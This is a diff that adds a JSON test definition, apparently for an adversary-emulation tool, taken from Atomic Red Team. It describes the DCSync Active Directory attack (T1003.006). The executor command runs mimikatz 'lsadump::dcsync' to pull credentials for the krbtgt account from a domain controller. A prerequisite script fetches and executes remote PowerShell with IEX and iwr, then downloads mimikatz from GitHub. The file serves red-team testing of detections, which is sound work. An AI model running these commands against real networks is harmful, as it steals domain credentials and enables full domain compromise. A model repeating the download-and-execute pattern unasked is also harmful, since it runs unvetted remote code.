@@ -1,0 +1,47 @@
+{
+    "name": "DCSync (Active Directory)",
+    "description": "Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database. Works against a remote Windows Domain Controller using the replication protocol. Privileges required: domain admin or domain controller account (by default), or any other account with required rights. [Reference](https://adsecurity.org/?p=1729) ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "command_prompt",
+        "elevation_required": false,
+        "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n",
+        "type": "Command Executor"
+    },
+    "id": "T1003.006",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "DCSync",
+    "source": "ART",
+    "uuid": "129efd28-8497-4c87-a1b0-73b9a870ca3e",
+    "arguments": {
+        "domain": {
+            "description": "Targeted Active Directory domain",
+            "type": "string",
+            "default": "%userdnsdomain%"
+        },
+        "user": {
+            "description": "Targeted user",
+            "type": "string",
+            "default": "krbtgt"
+        },
+        "mimikatz_path": {
+            "description": "Mimikatz windows executable",
+            "type": "path",
+            "default": "%tmp%\\mimikatz\\x64\\mimikatz.exe"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
+            "prereq_command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
